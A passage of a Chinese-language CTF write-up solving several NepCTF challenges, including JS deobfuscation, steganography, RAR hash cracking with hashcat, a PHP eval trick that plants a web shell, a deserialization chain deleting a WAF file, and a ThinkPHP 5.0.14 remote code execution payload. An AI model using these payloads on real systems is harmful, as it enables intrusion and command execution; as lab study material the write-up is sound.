class="string">&#x27;text&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> _0x336e = <span class="function"><span class="keyword">function</span> (<span class="params">_0x8710fc, _0xbfc9ff</span>) </span>&#123;</span><br><span class="line">_0x8710fc = _0x8710fc - <span class="number">169</span>;</span><br><span class="line"><span class="keyword">var</span> _0x377162 = _0x3771[_0x8710fc];</span><br><span class="line"><span class="keyword">return</span> _0x377162;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> _0x422051 = _0x336e;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x5ea0a5, _0x23a2f6</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x4b1718 = _0x336e;</span><br><span class="line"><span class="keyword">while</span> (!![]) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> _0x13718d = <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">179</span>)) * -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">187</span>)) + -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">185</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">196</span>)) + -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">172</span>)) + -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">199</span>)) * -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">188</span>)) + <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">170</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">197</span>)) + <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">191</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">198</span>)) + <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">181</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">184</span>));</span><br><span class="line"><span class="keyword">if</span> (_0x13718d === _0x23a2f6)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">_0x5ea0a5[<span class="string">&#x27;push&#x27;</span>](_0x5ea0a5[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">&#125; <span class="keyword">catch</span> (_0x2f82a9) &#123;</span><br><span class="line">_0x5ea0a5[<span class="string">&#x27;push&#x27;</span>](_0x5ea0a5[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;(_0x3771, <span class="number">843687</span>));</span><br><span class="line"><span class="keyword">if</span> (input[_0x422051(<span class="number">192</span>)] == _0x422051(<span class="number">186</span>) + _0x422051(<span class="number">195</span>) + _0x422051(<span class="number">171</span>) + _0x422051(<span class="number">169</span>) + <span class="string">&#x27;B-49&#x27;</span> + <span class="string">&#x27;31-A&#x27;</span> + _0x422051(<span class="number">177</span>) + _0x422051(<span class="number">173</span>) + _0x422051(<span class="number">175</span>) + _0x422051(<span class="number">180</span>) + <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">chest_lock[_0x422051(<span class="number">189</span>) + <span class="string">&#x27;ble&#x27;</span>] = !![], chest_unlock[_0x422051(<span class="number">189</span>) + <span class="string">&#x27;ble&#x27;</span>] = ![], input[_0x422051(<span class="number">189</span>) + <span class="string">&#x27;ble&#x27;</span>] = ![], balloon[<span class="string">&#x27;visi&#x27;</span> + <span class="string">&#x27;ble&#x27;</span>] = ![], dialog[_0x422051(<span class="number">192</span>)] = _0x422051(<span class="number">178</span>) + _0x422051(<span class="number">194</span>) + _0x422051(<span class="number">183</span>) + _0x422051(<span class="number">190</span>), dialog[_0x422051(<span class="number">182</span>) + <span class="string">&#x27;e&#x27;</span>][_0x422051(<span class="number">174</span>) + _0x422051(<span class="number">176</span>)] = <span class="number">64</span>, dialog[<span class="string">&#x27;x&#x27;</span>] = <span class="number">10</span>, dialog[<span class="string">&#x27;y&#x27;</span>] = <span class="number">50</span>, <span class="built_in">this</span>[_0x422051(<span class="number">189</span>) + _0x422051(<span class="number">193</span>)] = ![];</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">timeoutid != <span class="literal">null</span> &amp;&amp; <span class="built_in">clearTimeout</span>(timeoutid);</span><br><span class="line">prompts[_0x422051(<span class="number">189</span>) + _0x422051(<span class="number">193</span>)] = !![], balloon[_0x422051(<span class="number">189</span>) + _0x422051(<span class="number">193</span>)] = !![], timeoutid = <span class="built_in">setTimeout</span>(disappear, <span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键就在于 <code>if (input[_0x422051(192)] == _0x422051(186) + _0x422051(195) + _0x422051(171) + _0x422051(169) + &#39;B-49&#39; + &#39;31-A&#39; + _0x422051(177) + _0x422051(173) + _0x422051(175) + _0x422051(180) + &#39;&#125;&#39;) </code>。将 <code>==</code> 改作 <code>!=</code> 时可以得到 Congratulations!</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f103c270-2858-4c57-870f-e1631d283880/1616251624202.f25391dc5457e60d82e94809267ca6e0a71a1c31.png"></p><p>根据上一个画面可推知需要输入的正是 flag，因此此处的判断拼接判断的也是 flag，所以修改判断逻辑后加一句代码将其拼接的内容输出。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(_0x422051(<span class="number">186</span>) + _0x422051(<span class="number">195</span>) + _0x422051(<span class="number">171</span>) + _0x422051(<span class="number">169</span>) + <span class="string">&#x27;B-49&#x27;</span> + <span class="string">&#x27;31-A&#x27;</span> + _0x422051(<span class="number">177</span>) + _0x422051(<span class="number">173</span>) + _0x422051(<span class="number">175</span>) + _0x422051(<span class="number">180</span>) + <span class="string">&#x27;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>将代码写在 <code>if</code> 的逻辑内，将逻辑取反后再次触发 <code>onButtonClick()</code> 函数即可在控制台得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;39F24AE1-1DEB-4931-A6D6-36098DC3E558&#125;</span><br></pre></td></tr></table></figure><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>尝试把给出的内容放到 Sublime Text 里整理一下，用 CyberChef 把 <code>f</code> 替换成空格，再用 mspaint 稍作处理可以得到下图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f103c270-2858-4c57-870f-e1631d283880/1616256494781.f49d80c7b453075797bbf487ea25a192496bdbf0.png"></p><p>结合稍微的猜测，可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;Y0u_ar3_50_cl3ver!&#125;</span><br></pre></td></tr></table></figure><h3 id="make-hsy-great-again"><a href="#make-hsy-great-again" class="headerlink" title="make_hsy_great_again"></a>make_hsy_great_again</h3><p>010 editor 打开文件发现末尾有提示 <code>six</code>，猜测压缩包密码是六位数字。rar2john 首先算出压缩包的 hash 值如下。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2</span><br></pre></td></tr></table></figure><p>因为压缩包压缩方式是 RAR50，因此使用如下指令爆破压缩包密码。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat64.exe -m 13000 -a 3 &#39;$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2&#39; ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p>可以得到如下结果，因此压缩包密码是 520233。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2:520233</span><br></pre></td></tr></table></figure><p>将附件解压可得一张图片，使用 010 editor 打开可发现其尾部有倒过来的 PNG 图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f103c270-2858-4c57-870f-e1631d283880/1616258597840.15bb540d6e5e6f3fa59a03b82b66e4347d1754fe.png"></p><p>将其提取出来并 Reverse 一次可得到正常的一张 PNG 图片。使用 Stegsolve 可解出如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f103c270-2858-4c57-870f-e1631d283880/1616260624467.4ee4b70cfc08bce4f182d861c538404d0da37770.png@250h.png"></p><p>同时可以发现图片的右上角有类似 LSB 隐写的小点点。将图片逆时针旋转 $90^\circ$ 后提取 Alpha 3/2/1/0 几个通道的数据可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">541071015369783257979906983920769170889508850603835680538829064360913021</span><br></pre></td></tr></table></figure><p>简单 <code>long_to_bytes</code> 一下即可得到 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">541071015369783257979906983920769170889508850603835680538829064360913021</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;Qfrost_l0v3_hsy_v3r7_m0ch&#125;</span><br></pre></td></tr></table></figure><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><p>题目给出的代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nep</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    <span class="variable">$len</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$len</span>)&lt;<span class="number">8</span> &amp;&amp; strlen(<span class="variable">$nep</span>)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$nep</span>,<span class="number">0</span>,<span class="variable">$len</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很容易可以知道 <code>intval()</code> 处可以产生一个截断，因此 <code>$len</code> 实际上可以拼接长字符串而不影响判断。因此可以想办法在 <code>eval()</code> 中去执行到 <code>$len</code>。因此只需要 <code>$nep</code> 为 <code>&grave;$len&grave;</code>，并且让 <code>$len</code> 截断后得到数字 7 即可。此时在 <code>$len</code> 后拼接的指令将被执行。</p><p>因此可以构造出如下载荷来写入一个 shell。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;?nep&#x3D;&#96;$len&#96;;&amp;len&#x3D;7%20||%20echo%20%27&lt;?php%20phpinfo();eval(&quot;$_GET[1]&quot;);%27%20&gt;%20shell.php</span><br></pre></td></tr></table></figure><p>此时访问到 <code>.../shell.php</code> 即可看到 phpinfo。使用 GET 参数 1 即可传入执行指令，从而读到位于 nepctf.php 里的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;shell.php?1&#x3D;system(&quot;cat%20nepctf.php&quot;);</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &#39;NepCTF&#123;n3pn3p_l1ttle_tr1ck_c0me_bAck&#125;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;n3pn3p_l1ttle_tr1ck_c0me_bAck&#125;</span><br></pre></td></tr></table></figure><h3 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h3><h4 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h4><p>反序列化语句触发的条件如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>老生常谈的考点，只需要构造 <code>a[]=0e1&amp;b[]=0e2</code> 即可轻松绕过。同时，代码中出现的 <code>21232f297a57a5a743894a0e4a801fc3</code> 很容易使用 somd5 查得摘要前的值为 admin。</p><h4 id="反序列化读取文件"><a href="#反序列化读取文件" class="headerlink" title="反序列化读取文件"></a>反序列化读取文件</h4><p>给出的代码中可以触发到 <code>file_get_contents</code> 从而读到文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/f103c270-2858-4c57-870f-e1631d283880/1616415457020.bd4774ff20558d58744d0df46a1c8bf3dfb68e79.png"></p><p>结合代码开头的一句 <code>include(&#39;shell.php&#39;);</code> 可知需要读取的文件是 shell.php。往上追溯一下，可以发现需要先触发到 <code>login</code> 类的 <code>checking</code> 方法。再向上追溯到 <code>Game</code> 类的 <code>__destruct</code> 方法。因此直接构造出如下反序列化的代码用以生成载荷即可达成目的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span> . <span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$exp</span>));</span><br></pre></td></tr></table></figure><p>可以读取到 shell.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ZipArchive-原生类删除文件"><a href="#ZipArchive-原生类删除文件" class="headerlink" title="ZipArchive 原生类删除文件"></a>ZipArchive 原生类删除文件</h4><blockquote><p>参考文档：<a href="https://www.php.net/manual/zh/ziparchive.open.php#:~:text=3.%20Deletes%20the%20existing%20file%20before%20saving%20the%20temporary%20zip%20file%20on%20disk">https://www.php.net/manual/zh/ziparchive.open.php#:~:text=3.%20Deletes%20the%20existing%20file%20before%20saving%20the%20temporary%20zip%20file%20on%20disk</a></p></blockquote><p>根据 PHP 手册对于 <code>ZipArchive::open()</code> 的描述可知这个方法会在压缩文件后删除原本的文件。因此可以利用其去删除原本存在的 waf.txt 从而执行到 <code>shell()</code> 方法。<code>open()</code> 方法的用法描述如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ZipArchive</span>::<span class="title">open</span> (<span class="params"><span class="variable">$filename</span>, <span class="variable">$flags</span> = <span class="literal">null</span></span>) <span class="title">mixed</span></span></span><br><span class="line"><span class="function">(<span class="params">PHP <span class="number">5</span> &gt;= <span class="number">5.2</span>.<span class="number">0</span>, PECL zip &gt;= <span class="number">1.1</span>.<span class="number">0</span></span>) <span class="title">Open</span> <span class="title">a</span> <span class="title">ZIP</span> <span class="title">file</span> <span class="title">archive</span></span></span><br><span class="line"><span class="function"><span class="title">Parameters</span>:</span></span><br><span class="line">string $filename        The file name of the ZIP archive to open.</span><br><span class="line"><span class="keyword">int</span>    <span class="variable">$flags</span>[optional] The mode to <span class="keyword">use</span> <span class="title">to</span> <span class="title">open</span> <span class="title">the</span> <span class="title">archive</span>.</span><br><span class="line"><span class="title">ZipArchive</span>::<span class="title">OVERWRITE</span></span><br></pre></td></tr></table></figure><p>对比我们能够触发到的 <code>open()</code> 方法 <code>$this-&gt;file-&gt;open($this-&gt;filename, $this-&gt;content);</code> 可知我们需要控制 <code>$this-&gt;content</code> 为 int 类型。根据 <code>ZipArchive::open()</code> 中对于 <code>$flags</code> 的描述可知选择 <code>ZipArchive::OVERWRITE</code> 较合理。因此构造反序列化代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = ZipArchive::OVERWRITE;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$exp</span>));</span><br></pre></td></tr></table></figure><p>将如上代码生成的载荷打出即可成功删除 waf.txt。</p><h4 id="shell-读文件"><a href="#shell-读文件" class="headerlink" title="shell 读文件"></a>shell 读文件</h4><p>shell.php 中对于传入的内容做了严格的过滤并且限制了长度。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span></span><br><span class="line">preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>)</span><br></pre></td></tr></table></figure><p>因此能够使用的东西应该非常少，尝试构造出 <code>ls /bin</code> 来查看可执行的指令，可以找到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash bunzip2 bzcat bzcmp bzdiff bzegrep bzexe bzfgrep bzgrep bzip2 bzip2recover bzless bzmore cat chgrp chmod chown cp dash date dd df dir dmesg dnsdomainname domainname echo egrep false fgrep findmnt grep gunzip gzexe gzip hostname kill ln login ls lsblk mkdir mknod mktemp more mount mountpoint mv nisdomainname pidof ps pwd rbash readlink rm rmdir run-parts sed sh sh.distrib sleep stty su sync tailf tar tempfile touch true umount uname uncompress vdir wdctl which ypdomainname zcat zcmp zdiff zegrep zfgrep zforce zgrep zless zmore znew</span><br></pre></td></tr></table></figure><p>仔细看一下正则可以发现反斜杠并没有被匹配，因此 <code>n\l /flag</code> 作为一种九个字符的可行方案。除此之外，因为靶机本身有 PHP 环境，因此可以使用 <code>php /flag</code> 来读出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;b31a6e56-e2e9-41d9-8842-e54fe18a0bf9&#125;</span><br></pre></td></tr></table></figure><h3 id="faka-revenge"><a href="#faka-revenge" class="headerlink" title="faka_revenge"></a>faka_revenge</h3><p>下载附件之后可以得到部分源码，搜索 <code>think_version</code> 可以找到如下内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;THINK_VERSION&#x27;</span>, <span class="string">&#x27;5.0.14&#x27;</span>);</span><br></pre></td></tr></table></figure><p>因此可以得出这个 CMS 使用的 ThinkPHP 版本，由此找出对应的已经出现过的漏洞。</p><blockquote><p>参考文档：<a href="https://bbs.ichunqiu.com/article-1901-1.html">https://bbs.ichunqiu.com/article-1901-1.html</a></p></blockquote><p>稍微尝试可知 <code>system</code> 已经被禁用了，于是按照参考文章构造如下载荷。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;cat &#x2F;*&amp;_method&#x3D;__construct&amp;filter&#x3D;passthru</span><br></pre></td></tr></table></figure><p>将载荷打出即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;065d8c7c-b576-40f2-bdf6-c31ef5dd65b2&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF 2021</title>
      <link href="/zh-CN/posts/eb7f09c2.html"/>
      <url>/zh-CN/posts/eb7f09c2.html</url>
      
